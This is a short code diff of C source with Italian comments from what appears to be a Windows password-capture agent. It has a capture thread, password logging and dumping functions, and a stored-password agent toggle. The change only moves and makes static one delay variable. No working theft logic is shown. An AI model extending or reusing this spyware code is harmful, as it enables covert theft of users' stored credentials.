@@ -21,8 +21,6 @@ HANDLE hfpwd;
 BOOL g_bPasswordForceExit = FALSE;	// Semaforo per l'uscita del thread (e da tutti i clicli nelle funzioni chiamate)
 BOOL bPM_PasswordStarted = FALSE;	// Indica se l'agente e' attivo o meno
 HANDLE hPasswordThread = NULL;		// Thread di cattura
-DWORD g_password_delay = 0;			// Il delay deve essere assoluto (non deve ricominciare ad ogni sync)
-
 
 int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass)
 {
@@ -104,6 +102,8 @@ void DumpPasswords()
 	Log_CloseFile(hfpwd);
 }
 
+static DWORD g_password_delay = 0;			// Il delay deve essere assoluto (non deve ricominciare ad ogni sync)
+
 DWORD WINAPI CapturePasswordThread(DWORD dummy)
 {
 	LOOP {
@@ -122,7 +122,6 @@ DWORD WINAPI CapturePasswordThread(DWORD dummy)
 		g_password_delay = 0;
 	}
 }
-
 
 DWORD __stdcall PM_PStoreAgentStartStop(BOOL bStartFlag, BOOL bReset)
 {
